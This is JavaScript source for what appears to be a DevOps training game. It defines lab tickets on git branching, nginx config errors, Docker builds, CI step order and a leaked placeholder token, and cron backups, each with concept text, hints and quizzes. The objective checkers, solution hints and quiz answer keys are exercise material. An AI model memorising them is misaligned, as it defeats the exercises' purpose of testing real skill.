    const c1 = id('c1'), c2 = id('c2'), c3 = id('c3');
    S.git = { root, head:'main', ignore:[], index:{ ...tree }, upstream:{ main:true },
      commits:{ [c1]:{ id:c1, msg:'Initial status page', parent:null, tree:{ 'index.html':t1['index.html'], 'README.md':tree['README.md'] }, date:'Mon Oct 6 14:02:11 2026 +0000', author:'Jules Martin <jules@halcyon.lan>' }, [c2]:{ id:c2, msg:'Add component colours', parent:c1, tree:t1, date:'Thu Oct 23 09:41:57 2026 +0000', author:'Jules Martin <jules@halcyon.lan>' }, [c3]:{ id:c3, msg:'Show partner API as degraded', parent:c2, tree:{ ...tree }, date:'Tue Nov 10 01:44:03 2026 +0000', author:'ops <ops@halcyon.lan>' } },
      branches:{ main:c3 }, remoteBranches:{ main:c3 } };
  },
  objectives:[
    { text:'See what state the repository is in: `git status`', check:okOn('git', ev => ev.args[0] === 'status') },
    { text:'Create and switch to a branch named `fix/footer-typo`', check:st(S => S.git.head === 'fix/footer-typo') },
    { text:'Fix both "Frieght" typos in `index.html`', check:st(S => { const c = getNode(S, '/home/ops/status-page/index.html').content; return !/Frieght/.test(c) && (c.match(/Halcyon Freight/g) || []).length >= 2; }) },
    { text:'Commit the fix on your branch, with index.html only and not incident-notes.md', check:st(S => { const G = S.git; const id = G.branches['fix/footer-typo']; if (!id || id === G.branches.main) return false; const t = G.commits[id].tree; return t['index.html'] && !/Frieght/.test(t['index.html']) && !('incident-notes.md' in t); }) },
    { text:'Push the branch to origin so it can be reviewed', check:st(S => { const G = S.git; return G.remoteBranches['fix/footer-typo'] && G.remoteBranches['fix/footer-typo'] === G.branches['fix/footer-typo'] && !('incident-notes.md' in G.commits[G.branches['fix/footer-typo']].tree); }) },
  ],
  hints:['`git switch -c fix/footer-typo` (or `git checkout -b fix/footer-typo`) creates the branch and moves you onto it.', '`sed -i \'s/Frieght/Freight/g\' index.html` fixes both lines. Check with `git diff`.', '`git add index.html` (not `git add .`), then `git commit -m "Fix Freight typo"`, then `git push -u origin fix/footer-typo`.'],
  quiz:[
    { q:'You `git add` a file, then edit it again. What will `git commit` save?', o:['The latest edits', 'The version you staged, not the later edits', 'Both versions', 'Nothing, it errors'], a:1, why:'Commits are made from the staging area. Stage again to include the newer edits.' },
    { q:'Why fix this on a branch instead of committing straight to main?', o:['Branches are faster', 'main stays deployable while the change is reviewed in a pull request', 'Git requires it', 'To hide the change'], a:1, why:'Review, CI and an easy rollback all come from keeping changes off main until approved. Here main is even protected.' },
  ],
  debrief:'<p>That is the daily loop of almost every engineering team: branch, change, review the diff, stage deliberately, commit with a clear message, push, then open a pull request. Add <code>incident-notes.md</code> to <code>.gitignore</code> so it can never be committed by accident. Never commit secrets: history is forever (see OPS-304).</p>',
},
/* -------------------------------------------------------------- OPS-302 */
{
  id:'ops-2', track:'ops', code:'OPS-302', title:'The web server won\'t start', host:'hf-web01', cwd:HOME, xp:180,
  from:'Uptime monitor · 02:28',
  ticket:'status.halcyon.lan (hf-web01) refuses connections. Someone pushed an nginx config change at 01:30 and went home. Get it serving again.',
  concept:`<p>Long-running programs such as web servers and databases run as <strong>services</strong> managed by <strong>systemd</strong>. <code>systemctl</code> starts, stops and inspects them, and <code>journalctl</code> shows their logs. A service that fails to start almost always says why in its logs, often with a file name and line number.</p>
<p>nginx can check its own config with <code>nginx -t</code> without touching the running server. Always test before you apply. <code>restart</code> stops and starts the service, causing a brief outage. <code>reload</code> re-reads the config without dropping connections, and if the new config is broken it keeps running the old one.</p>
<p>When a web server answers with <strong>404 Not Found</strong>, the server is up and reachable but couldn't find the file for that URL. Check its <strong>error log</strong> and the <code>root</code> directive, which says which folder it serves files from.</p>`,
  diagram:`  edit config ─▶ sudo nginx -t ─ ok ─▶ sudo systemctl reload nginx ─▶ curl -I localhost
                     │ fails
                     └─▶ read the file:line it reports ─▶ fix ─▶ test again
  HTTP: 200 OK · 301/302 redirect · 403 forbidden · 404 not found · 500 server error · 502 bad gateway`,
  cmds:[['systemctl status nginx', 'Is it running? Recent log lines'], ['journalctl -u nginx', 'Full log of the service'], ['sudo nginx -t', 'Validate the config'], ['sudo systemctl start|reload nginx', 'Start it, or apply a new config'], ['curl -I localhost', 'Just the response status and headers'], ['tail /var/log/nginx/error.log', 'What nginx itself complained about']],
  files:() => ({
    '/etc/nginx/nginx.conf':J('user www-data;', 'worker_processes auto;', 'pid /run/nginx.pid;', 'error_log /var/log/nginx/error.log;', '', 'events {', '    worker_connections 768;', '}', '', 'http {', '    include /etc/nginx/mime.types;', '    access_log /var/log/nginx/access.log;', '', '    server {', '        # changed 01:30 — move status page to new docroot', '        listen 80', '        server_name status.halcyon.lan;', '        root /var/www/statuspage;', '        index index.html;', '    }', '}'),
    '/etc/nginx/mime.types':'types { text/html html; text/css css; }\n',
    '/var/www/status-page/index.html':J('<!doctype html>', '<title>Halcyon Freight — System Status</title>', '<h1>All systems operational</h1>', '<p>Shipment tracking · Customer portal · Partner API (degraded)</p>'),
    '/var/log/nginx/error.log':'2026/11/09 22:14:03 [notice] 902#902: signal process started\n', '/var/log/nginx/access.log':'',
  }),
  net:() => stdNet('10.20.4.30', 24, '10.20.4.1'),
  setup:S => {
    const conf = getNode(S, '/etc/nginx/nginx.conf').content; const t = nginxTest(conf);
    const L = l => `Nov 10 01:31:02 hf-web01 ${l}`;
    S.services.nginx = nginxService({ state:'failed', logs:[L('systemd[1]: Starting nginx.service - A high performance web server and a reverse proxy server...'), ...t.lines.map(x => L('nginx[2210]: ' + x)), L('nginx[2210]: nginx: configuration file /etc/nginx/nginx.conf test failed'), L('systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE'), L('systemd[1]: nginx.service: Failed with result \'exit-code\'.'), L('systemd[1]: Failed to start nginx.service - A high performance web server and a reverse proxy server.')] });
  },
  objectives:[
    { text:'Check the service: `systemctl status nginx`', check:on('systemctl', ev => ev.args.includes('status') && ev.args.some(a => /nginx/.test(a))) },
    { text:'Read its full logs to find the error: `journalctl -u nginx`', check:okOn('journalctl', ev => ev.meta.unit === 'nginx') },
    { text:'Fix the config until `sudo nginx -t` passes', check:okOn('nginx', ev => ev.meta.test === true) },
    { text:'Start nginx', check:st(S => S.services.nginx.state === 'active') },
    { text:'Make `curl localhost` return 200 OK with the status page', check:okOn('curl', ev => ev.meta.port === 80 && ev.meta.status === 200) },
  ],
  hints:['The log says: directive "listen" is not terminated by ";" in /etc/nginx/nginx.conf:16. Edit with `sudo nano /etc/nginx/nginx.conf` and add the missing `;`.', 'After `sudo nginx -t` passes, run `sudo systemctl start nginx`. A 404 means nginx is up but serving from the wrong folder. Check `tail /var/log/nginx/error.log` and `ls /var/www`.', 'Change `root /var/www/statuspage;` to `root /var/www/status-page;`, then `sudo nginx -t && sudo systemctl reload nginx`.'],
  quiz:[
    { q:'What is the difference between `systemctl restart` and `systemctl reload` for nginx?', o:['None', 'restart stops and starts (a brief outage); reload re-reads the config while running', 'reload also reboots the server', 'restart only works as root'], a:1, why:'reload sends nginx a signal to re-read its config gracefully. A broken config is rejected and the old one keeps serving.' },
    { q:'curl gets "404 Not Found" from nginx. What do you know for sure?', o:['nginx is down', 'DNS is broken', 'nginx is running and reachable, but no file exists for that URL under its root', 'The firewall blocked you'], a:2, why:'Any HTTP status proves the server answered. 404 points at paths: root, index, or the URL.' },
  ],
  debrief:'<p>Two bugs, a classic pair: a syntax error that kept nginx from starting, then a logic error (a wrong path) that only showed once it ran. The fix pattern works for almost any service: <strong>status → logs → test config → apply → verify from the outside</strong>. In production, config changes go through review and CI that runs <code>nginx -t</code>, so this never reaches a server at 01:30.</p>',
},
/* -------------------------------------------------------------- OPS-303 */
{
  id:'ops-3', track:'ops', code:'OPS-303', title:'Works on my machine: containers', host:'hf-build01', cwd:'/home/ops/tracker-api', xp:190,
  from:'Platform team · 02:31',
  ticket:'tracker-api has to run as a container on hf-build01, reachable on host port 8080. The intern says the Dockerfile "works on my machine". It doesn\'t here.',
  concept:`<p>A <strong>container image</strong> is a packaged filesystem plus a start command: your app, its runtime and its libraries, built from a <strong>Dockerfile</strong> one instruction at a time. A <strong>container</strong> is a running instance of an image, isolated from the host and from other containers. Same image, same behaviour, on any machine.</p>
<p>Key instructions: <code>FROM</code> picks the base image, <code>WORKDIR</code> sets the folder later steps run in, <code>COPY</code> brings files from the build context (your folder) into the image, <code>RUN</code> executes at build time, <code>EXPOSE</code> documents a port, and <code>CMD</code> is what runs when a container starts. If a file is never COPYed, it doesn't exist inside the image, even though it sits right next to the Dockerfile on your disk.</p>
<p>Containers have their own network. An app listening on port 3000 <em>inside</em> is unreachable from the host until you <strong>publish</strong> it: <code>-p HOST:CONTAINER</code>, e.g. <code>-p 8080:3000</code>.</p>`,
  diagram:`  Dockerfile ──docker build──▶ image ──docker run──▶ container
   FROM node:20-alpine         (layers)              ┌───────────────┐
   WORKDIR /app                                      │ node server.js │
   COPY … ; RUN npm install                          │ listens :3000  │
                                                     └───────▲───────┘
  host :8080 ─────────────── -p 8080:3000 ───────────────────┘`,
  cmds:[['docker build -t NAME .', 'Build an image from ./Dockerfile'], ['docker run -d -p 8080:3000 NAME', 'Start a container in the background with a published port'], ['docker ps -a', 'All containers, including ones that exited'], ['docker logs NAME', 'A container\'s output, where crashes show up'], ['docker rm -f NAME', 'Remove a container']],
  files:() => ({
    '/home/ops/tracker-api/Dockerfile':J('FROM node:20-alpine', 'WORKDIR /app', 'COPY package.json .', 'RUN npm install --omit=dev', 'EXPOSE 3000', 'CMD ["node", "server.js"]'),
    '/home/ops/tracker-api/package.json':J('{', '  "name": "tracker-api",', '  "version": "1.4.0",', '  "main": "server.js",', '  "scripts": { "start": "node server.js", "test": "jest --ci" },', '  "dependencies": { "pg": "^8.13.0" }', '}'),
    '/home/ops/tracker-api/server.js':J('const http = require("http");', 'const PORT = process.env.PORT || 3000;', '', 'http.createServer((req, res) => {', '  if (req.url.startsWith("/health")) return res.end(JSON.stringify({ status: "ok" }));', '  res.end(JSON.stringify({ shipments: [] }));', '}).listen(PORT, () => console.log(`tracker-api listening on :${PORT}`));'),
    '/home/ops/tracker-api/.dockerignore':J('node_modules', '.git', '.env'),
    '/home/ops/tracker-api/README.md':J('# tracker-api', 'Shipment tracking API. Listens on PORT (default 3000).'),
  }),
  net:() => stdNet('10.20.4.51', 24, '10.20.4.1'),
  setup:S => { S.docker = { images:{ 'node:20-alpine':{ base:'node:20-alpine', id:sha256('node20'), created:Date.now() - 86400000 * 9, files:[], hasServer:false, env:{} } }, containers:[] }; },
  objectives:[
    { text:'Build the image, tagged tracker-api: `docker build -t tracker-api .`', check:okOn('docker', ev => ev.args[0] === 'build' && ev.meta.image === 'tracker-api:latest') },
    { text:'Run it detached, then find out why the container dies with `docker logs`', check:(S, ev) => (!!ev && ev.name === 'docker' && ev.args[0] === 'logs' && ev.meta.crashed) || !!S.docker.images['tracker-api:latest']?.hasServer },
    { text:'Fix the Dockerfile and rebuild so the image actually contains server.js', check:st(S => S.docker.images['tracker-api:latest'] && S.docker.images['tracker-api:latest'].hasServer) },
    { text:'Run a container publishing host port 8080 to the app\'s port 3000', check:st(S => S.docker.containers.some(c => c.status === 'running' && S.docker.images[c.image]?.hasServer && c.ports.some(p => p.host === 8080 && p.cont === 3000))) },
    { text:'Verify from the host: `curl localhost:8080/health`', check:okOn('curl', ev => ev.meta.port === 8080 && ev.meta.status === 200) },
  ],
  hints:['After `docker build -t tracker-api .`, run `docker run -d tracker-api`, then `docker ps -a` to see it Exited (1), and `docker logs <name>`.', '"Cannot find module /app/server.js": the Dockerfile only COPYs package.json. Add `COPY . .` after the RUN line (sudo isn\'t needed: you own this folder), then rebuild.', '`docker run -d -p 8080:3000 tracker-api`, then `curl localhost:8080/health`. If 8080 is "already allocated", `docker rm -f` the old container first.'],
  quiz:[
    { q:'What is the difference between an image and a container?', o:['None', 'An image is the packaged template; a container is a running instance of it', 'A container is a compressed image', 'Images run, containers are stored'], a:1, why:'Like a class and an object: one image can start many containers.' },
    { q:'What does `-p 8080:3000` do?', o:['Limits the app to 8080 MB of RAM', 'Forwards host port 8080 to port 3000 inside the container', 'Forwards container port 8080 to host 3000', 'Opens both ports on the firewall'], a:1, why:'The order is HOST:CONTAINER. Traffic to the host on 8080 lands on the app listening on 3000 inside.' },
  ],
  debrief:'<p>"Works on my machine" happened because the intern ran <code>node server.js</code> from their own folder, where server.js exists. The image never had it. Copying package.json first and the rest of the code later is deliberate: Docker caches layers, so dependencies only reinstall when package.json changes. Next steps in real life: push the image to a registry, and run it from Compose or Kubernetes with health checks that hit <code>/health</code>.</p>',
},
/* -------------------------------------------------------------- OPS-304 */
{
  id:'ops-4', track:'ops', code:'OPS-304', title:'Red pipeline, leaked token', host:'hf-dev01', cwd:'/home/ops/tracker-api', xp:190,
  from:'Dev team · 02:35',
  ticket:'tracker-api\'s CI has been red for two days and nobody knows why. Also, someone says there\'s a token sitting in the workflow file?',
  concept:`<p><strong>Continuous Integration (CI)</strong> runs an automated pipeline on every push: a fresh machine checks out the code, installs dependencies, builds and tests it. Broken changes are caught before they merge. GitHub Actions describes pipelines in YAML under <code>.github/workflows/</code>.</p>
<p>A workflow has triggers (<code>on:</code>), jobs, and steps. Steps run <strong>top to bottom</strong> on a clean runner, so tests can only pass if dependencies were installed in an earlier step. If one step fails, the rest are skipped. YAML structure comes from indentation: use spaces, never tabs.</p>
<p><strong>Secrets never belong in a repository.</strong> Anyone who can read the code can read them, and they stay in git history forever. Store them in the CI platform's secret store and reference them as <code>\${{ secrets.NAME }}</code>; the runner injects them at run time and masks them as *** in logs. Once a secret has been committed, assume it is compromised and <strong>rotate</strong> it.</p>`,
  diagram:`  git push ─▶ fresh runner ─▶ checkout ─▶ setup-node ─▶ npm ci ─▶ npm test ─▶ upload coverage
                                                   ▲ installs   ▲ needs the      ▲ needs a token:
                                                     deps         installed deps   \${{ secrets.X }}
  a failed step stops the job · act runs this locally · gitleaks hunts for leaked secrets`,
  cmds:[['act', 'Run the workflow locally, step by step'], ['cat .github/workflows/ci.yml', 'Read the pipeline'], ['nano .github/workflows/ci.yml', 'Edit it'], ['gitleaks detect', 'Scan the repo for secrets']],
  files:() => ({
    '/home/ops/tracker-api/.github/workflows/ci.yml':J('name: CI', '', 'on:', '  push:', '    branches: [main]', '  pull_request:', '', 'jobs:', '  test:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '', '      - uses: actions/setup-node@v4', '        with:', '          node-version: 20', '          cache: npm', '', '      - name: Run tests', '        run: npm test', '', '      - name: Install dependencies', '        run: npm ci', '', '      - name: Upload coverage', '        run: ./scripts/upload-coverage.sh', '        env:', '          COVERAGE_TOKEN: cov_live_8f2a91c4d7e3b6a0'),
    '/home/ops/tracker-api/package.json':J('{', '  "name": "tracker-api",', '  "version": "1.4.0",', '  "scripts": { "start": "node server.js", "test": "jest --ci" },', '  "devDependencies": { "jest": "^29.7.0" }', '}'),
    '/home/ops/tracker-api/server.js':'require("http").createServer((q, s) => s.end("ok")).listen(process.env.PORT || 3000);\n',
    '/home/ops/tracker-api/scripts/upload-coverage.sh':{ content:J('#!/usr/bin/env bash', 'curl -s -H "Authorization: Bearer $COVERAGE_TOKEN" --data-binary @coverage/lcov.info https://coverage.halcyon.lan/upload'), mode:'755' },
    '/home/ops/tracker-api/.gitignore':J('node_modules/', '.env', '.secrets'),
    '/home/ops/tracker-api/.secrets':{ content:'# local copy of repo secrets for act (git-ignored). Rotated 02:30 by infra.\nCOVERAGE_TOKEN=cov_rot_51c0e7aa92d4\n', mode:'600' },
  }),
  net:() => stdNet('10.20.4.45', 24, '10.20.4.1'),
  setup:S => { S.ci = { root:'/home/ops/tracker-api' }; },
  objectives:[
    { text:'Run the pipeline locally to see it fail: `act`', check:on('act') },
    { text:'Fix the step order so dependencies are installed before tests run', check:st(S => { const p = parseWorkflow(getNode(S, '/home/ops/tracker-api/.github/workflows/ci.yml')?.content || ''); if (p.err) return false; const i = p.steps.findIndex(s => /npm (ci|install)/.test(s.run || '')), t = p.steps.findIndex(s => /npm (run )?test/.test(s.run || '')); return i >= 0 && t >= 0 && i < t; }) },
    { text:'Scan the repository for leaked secrets: `gitleaks detect`', check:on('gitleaks') },
    { text:'Replace the hard-coded token with the repository secret `${{ secrets.COVERAGE_TOKEN }}`', check:st(S => { const c = getNode(S, '/home/ops/tracker-api/.github/workflows/ci.yml')?.content || ''; return !/cov_live_/.test(c) && /COVERAGE_TOKEN:\s*\$\{\{\s*secrets\.COVERAGE_TOKEN\s*\}\}/.test(c); }) },
    { text:'Get a green run: `act` succeeds and `gitleaks detect` finds nothing', check:(S, ev) => !!ev && ev.name === 'act' && ev.code === 0 && !/cov_live_/.test(getNode(S, '/home/ops/tracker-api/.github/workflows/ci.yml')?.content || '') },
  ],
  hints:['act fails at "Run tests" with `jest: not found`: the tests run before `npm ci` has installed anything.', 'In `nano .github/workflows/ci.yml`, move the "Install dependencies" step (its name: and run: lines) above "Run tests". Keep the same indentation, using spaces only.', 'Change the env line to `COVERAGE_TOKEN: ${{ secrets.COVERAGE_TOKEN }}`. act reads local secrets from the git-ignored .secrets file.'],
  quiz:[
    { q:'A token was committed, then deleted in the next commit. Is it safe now?', o:['Yes, it is gone', 'No: it is still in git history and anyone with the repo can read it, so rotate it', 'Only if the repo is private', 'Yes, if you force-push'], a:1, why:'Treat any committed secret as leaked. Rotation is the only real fix; history rewriting is cleanup on top.' },
    { q:'Why did the job fail with `jest: not found`?', o:['jest is not installed globally', 'Tests ran before the step that installs dependencies', 'Node 20 does not support jest', 'The runner was offline'], a:1, why:'Every CI run starts on a clean machine. Steps run in order, and nothing is installed until npm ci runs.' },
  ],
  debrief:'<p>Two classic CI issues in one file. Real-world follow-ups: infra already rotated the token (good, the old one is dead); add gitleaks as a <strong>pre-commit hook</strong> and a CI step so leaks are blocked before they land; enable GitHub push protection; require the CI check to pass before merging; and pin action versions. Use <code>npm ci</code> rather than <code>npm install</code> in CI, because it installs exactly what the lockfile says.</p>',
},
/* -------------------------------------------------------------- OPS-305 */
{
  id:'ops-5', track:'ops', code:'OPS-305', title:'Schedule the nightly backup', host:'hf-db01', cwd:HOME, xp:160,
  from:'DBA on call · 02:40',
  ticket:'The nightly shipments database backup on hf-db01 was never scheduled after the migration. Run it at 02:30 every night with output appended to /var/log/backup.log, plus a weekly prune of old backups on Sundays at 03:00.',
  concept:`<p><strong>cron</strong> runs commands on a schedule. Each user has a <strong>crontab</strong> with one job per line: five time fields, then the command. <code>*</code> means "every", <code>*/15</code> means every 15, <code>1-5</code> is a range, and <code>1,15</code> is a list. Day of week runs 0–7, where both 0 and 7 are Sunday.</p>
<p>Jobs run with a <strong>minimal environment</strong>: a short PATH, no terminal, and none of your shell settings. So use <strong>absolute paths</strong>, and send output somewhere you can read it. <code>&gt;&gt; file</code> appends standard output, and <code>2&gt;&amp;1</code> sends errors to the same place. Otherwise a failing job fails silently every night.</p>
<p>Always run the script once by hand before you schedule it. If it doesn't work interactively, it won't work at 02:30 either.</p>`,
  diagram:`  ┌───────────── minute        0-59
  │  ┌────────── hour          0-23
  │  │ ┌──────── day of month  1-31
  │  │ │ ┌────── month         1-12
  │  │ │ │ ┌──── day of week   0-7 (0 or 7 = Sunday)
  │  │ │ │ │
  30 2 * * *   /opt/backup/backup.sh >> /var/log/backup.log 2>&1
  */15 9-17 * * 1-5   → every 15 min, 09:00–17:45, Monday to Friday`,
  cmds:[['crontab -l', 'List your scheduled jobs'], ['crontab -e', 'Edit them (opens nano; save to install)'], ['/opt/backup/backup.sh', 'Run the backup once by hand'], ['tail /var/log/backup.log', 'Check what scheduled runs logged']],
  files:() => ({
    '/opt/backup/backup.sh':{ content:J('#!/usr/bin/env bash', 'set -euo pipefail', 'STAMP=$(date +%F)', 'pg_dump -Fc shipments | gzip > /var/backups/db/shipments-$STAMP.sql.gz', 'echo "[$(date -Is)] backup ok: shipments-$STAMP.sql.gz"'), mode:'755' },
    '/opt/backup/prune.sh':{ content:J('#!/usr/bin/env bash', '# keep 14 days of backups', 'find /var/backups/db -name "*.sql.gz" -mtime +14 -print -delete'), mode:'755' },
    '/opt/backup/README':J('backup.sh — dumps the shipments DB to /var/backups/db (run as ops)', 'prune.sh  — deletes backups older than 14 days'),
    '/var/backups/db/':{}, '/var/backups/db/shipments-2026-10-29.sql.gz':'(binary)',
    '/var/log/backup.log':{ content:'', owner:'ops' },
  }),
  net:() => stdNet('10.20.4.60', 24, '10.20.4.1'),
  setup:S => {
    S.cron = { text:null, draft:null };
    S.scripts['/opt/backup/backup.sh'] = S2 => { const p = '/var/backups/db/shipments-2026-11-10.sql.gz'; writeFile({ ...S2, root:true }, p, '(binary)', false); return ok(`[2026-11-10T${shiftTime(true)}+00:00] backup ok: shipments-2026-11-10.sql.gz (14.2 MB)`); };
    S.scripts['/opt/backup/prune.sh'] = () => ok('/var/backups/db/shipments-2026-10-29.sql.gz');
  },
  objectives:[
    { text:'Check what is scheduled now: `crontab -l`', check:on('crontab', ev => ev.args.includes('-l')) },
    { text:'Run the backup script once by hand to prove it works', check:okOn('/opt/backup/backup.sh') },
    { text:'Schedule `/opt/backup/backup.sh` at 02:30 every day (`crontab -e`)', check:st(S => cronJobs(S).some(j => isBackup(j))) },
    { text:'On that same line, append its output (and errors) to `/var/log/backup.log`', check:st(S => cronJobs(S).some(j => isBackup(j) && />>\s*\/var\/log\/backup\.log/.test(j.cmd))) },
    { text:'Schedule `/opt/backup/prune.sh` every Sunday at 03:00', check:st(S => cronJobs(S).some(j => !j.reboot && /\/opt\/backup\/prune\.sh/.test(j.cmd) && same(j.min, [0]) && same(j.hour, [3]) && same(j.dow, [0]) && j.star[2] && j.star[3])) },
  ],
  onEvent:(S, ev) => { if (ev.name.endsWith('/opt/backup/backup.sh') || (ev.name === 'bash' && /backup\.sh/.test(ev.args[0] || ''))) ev.name = '/opt/backup/backup.sh'; },
  hints:['Run `/opt/backup/backup.sh` first. Then `crontab -e` opens nano with a commented template; add your lines at the bottom.', 'Backup line: `30 2 * * * /opt/backup/backup.sh >> /var/log/backup.log 2>&1`', 'Prune line: `0 3 * * 0 /opt/backup/prune.sh`. Save with Ctrl+S and exit with Ctrl+X. "installing new crontab" means it took.'],
  quiz:[
    { q:'What does `*/15 9-17 * * 1-5` mean?', o:['Every 15 hours on weekdays', 'Every 15 minutes from 09:00 to 17:45, Monday to Friday', 'At 09:15 and 17:15 daily', 'Every 15 days in September'], a:1, why:'Minute */15, hours 9 through 17, any day of month, any month, weekdays 1–5.' },
    { q:'A script works when you run it, but fails silently from cron. Most likely cause?', o:['cron is broken', 'cron\'s minimal environment: relative paths or a missing PATH, and no output redirection to show the error', 'The script is too long', 'cron only runs as root'], a:1, why:'Use absolute paths and redirect output to a log, and the error will show up there.' },
  ],
  debrief:'<p>Backups you never test restoring are only hopes. Add a monthly restore drill. Alternatives to cron: <strong>systemd timers</strong> (logs in journalctl, catch-up after downtime), or your platform\'s scheduler (Kubernetes CronJob, cloud schedulers). Monitoring should also alert when <code>backup.log</code> stops getting fresh "backup ok" lines. That is a dead man\'s switch.</p>',
},
];
const cronJobs = S => S.cron && S.cron.text ? parseCron(S.cron.text).jobs : [];
const same = (set, arr) => set && set.size === arr.length && arr.every(v => set.has(v));
const isBackup = j => !j.reboot && /\/opt\/backup\/backup\.sh/.test(j.cmd) && same(j.min, [30]) && same(j.hour, [2]) && j.star[2] && j.star[3] && (j.star[4] || j.dow.size === 7);
const TRACKS = { net:{ name:'Networking', short:'NET' }, sec:{ name:'Cybersecurity', short:'SEC' }, ops:{ name:'DevOps', short:'OPS' } };
